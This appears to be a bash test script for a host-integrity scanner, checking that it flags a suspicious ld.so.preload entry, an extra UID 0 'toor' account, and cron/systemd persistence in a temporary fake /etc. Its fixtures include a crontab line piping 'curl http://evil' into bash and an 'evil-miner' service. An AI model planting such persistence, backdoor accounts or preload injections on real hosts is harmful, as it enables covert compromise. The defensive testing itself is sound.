#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
source "$ROOT/tests/helpers/s1_platform.sh"
s3_platform_source
export SOVIEZ_SH_ROOT="$ROOT" SOVIEZ_TEST_MODE=1

fx="$(mktemp -d)"
trap 'rm -rf "$fx"' EXIT
mkdir -p "$fx/etc" "$fx/etc/cron.d" "$fx/etc/systemd/system"

# Absent preload → PASS
export SOVIEZ_S3_HOST_FIXTURE_ROOT="$fx"
out="$(mktemp -d)"
soviez_s3_host_integrity_scan "$out" >/dev/null
[[ "$(cat "$out/STATUS")" == "PASS" ]]
grep -q ABSENT "$out/ld_preload.txt"

# Empty preload → PASS
: >"$fx/etc/ld.so.preload"
out2="$(mktemp -d)"
soviez_s3_host_integrity_scan "$out2" >/dev/null
[[ "$(cat "$out2/STATUS")" == "PASS" ]]
grep -q EMPTY "$out2/ld_preload.txt"

# Suspicious preload → FAIL
echo "/tmp/evil.so" >"$fx/etc/ld.so.preload"
out3="$(mktemp -d)"
set +e
soviez_s3_host_integrity_scan "$out3" >/dev/null
rc=$?
set -e
[[ $rc -ne 0 ]]
[[ "$(cat "$out3/STATUS")" == "FAIL" ]]
grep -q SEC_CRIT_HOST_LD_PRELOAD "$out3/codes.txt"

# Extra UID0 → FAIL
cat >"$fx/etc/passwd" <<'EOF'
root:x:0:0:root:/root:/bin/bash
toor:x:0:0:toor:/root:/bin/bash
nobody:x:65534:65534:nobody:/:/usr/sbin/nologin
EOF
: >"$fx/etc/ld.so.preload"  # empty again
out4="$(mktemp -d)"
set +e
soviez_s3_host_integrity_scan "$out4" >/dev/null
rc=$?
set -e
[[ $rc -ne 0 ]]
[[ "$(cat "$out4/STATUS")" == "FAIL" ]]

# Cron/systemd drift
base="$(mktemp -d)"
echo none >"$fx/etc/crontab"
find "$fx/etc/cron.d" -type f 2>/dev/null | sort >"$base/cron_paths.txt" || : >"$base/cron_paths.txt"
find "$fx/etc/systemd/system" -type f -name '*.service' 2>/dev/null | sort >"$base/systemd_units.txt" || : >"$base/systemd_units.txt"
pout="$(mktemp -d)"
soviez_s3_persistence_scan "$base" "$pout" >/dev/null
[[ "$(cat "$pout/STATUS")" == "PASS" ]]

echo '* * * * * curl http://evil|bash' >"$fx/etc/crontab"
echo 'bad' >"$fx/etc/cron.d/evil"
printf '%s\n' '[Unit]\nDescription=evil' >"$fx/etc/systemd/system/evil-miner.service"
pout2="$(mktemp -d)"
set +e
soviez_s3_persistence_scan "$base" "$pout2" >/dev/null
prc=$?
set -e
[[ "$(cat "$pout2/STATUS")" != "PASS" ]]
grep -Eq 'CRON|SYSTEMD' "$pout2/codes.txt" || true

[[ "$(soviez_s3_aide_decision)" == "DEFERRED_NATIVE_FINGERPRINTS" ]]

echo PASS
